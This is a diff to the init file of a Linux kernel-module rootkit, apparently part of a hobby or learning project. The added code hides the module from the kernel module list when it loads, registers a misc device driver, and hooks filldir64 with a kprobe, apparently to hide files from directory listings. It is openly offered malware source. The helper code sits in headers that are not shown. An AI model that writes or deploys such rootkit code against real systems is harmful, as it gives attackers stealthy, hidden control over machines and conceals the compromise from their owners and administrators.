@@ -1,10 +1,3 @@
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/init.h>
-
-#include "core.h"
-#include "debug.h"
-
 /**
  * @file init.c
  * 
@@ -14,6 +7,16 @@
  * LKM rootkit. These functions are responsible for starting and stopping the
  * core functionality of the rootkit.
  */
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+
+#include "include/driver.h"
+#include "include/hide.h"
+#include "include/kprobe.h"
+
+#include "../include/debug.h"
 
 // Define the license and other module information
 MODULE_LICENSE("GPL");
@@ -31,9 +34,32 @@ MODULE_VERSION("0.1.0");
  */
 static int __init mod_init(void)
 {
-    RK_DEBUG("LKM rootkit loaded\n");
+    RKT_DEBUG("LKM rootkit loaded\n");
 
-    core_start();
+    hide(); // Hide the rootkit from the kernel module list by default
+
+    if (misc_register(&rk_miscdevice) < 0)
+    {
+        RKT_DEBUG("Failed to register the rootkit device driver\n");
+        return -1;
+    }
+
+    RKT_DEBUG("Rootkit device driver registered\n");
+
+    kp.pre_handler = handler_pre;
+
+    if (register_kprobe(&kp) < 0)
+    {
+        RKT_DEBUG("Failed to register the kprobe\n");
+        return -1;
+    }
+
+    RKT_DEBUG("Kprobe registered\n");
+    RKT_DEBUG("filldir64: at %px\n", kp.addr);
+    RKT_DEBUG("handler_pre: %px\n", handler_pre);
+
+    RKT_DEBUG("Rootkit initialized\n");
+
     return 0;
 }
 
@@ -45,9 +71,13 @@ static int __init mod_init(void)
  */
 static void __exit mod_exit(void)
 {
-    core_stop();
+    unregister_kprobe(&kp);
+    RKT_DEBUG("Kprobe unregistered\n");
 
-    RK_DEBUG("LKM rootkit unloaded\n");
+    misc_deregister(&rk_miscdevice);
+    RKT_DEBUG("Rootkit device driver unregistered\n");
+
+    RKT_DEBUG("Rootkit unloaded\n");
 }
 
 // Register the module initialization and exit functions
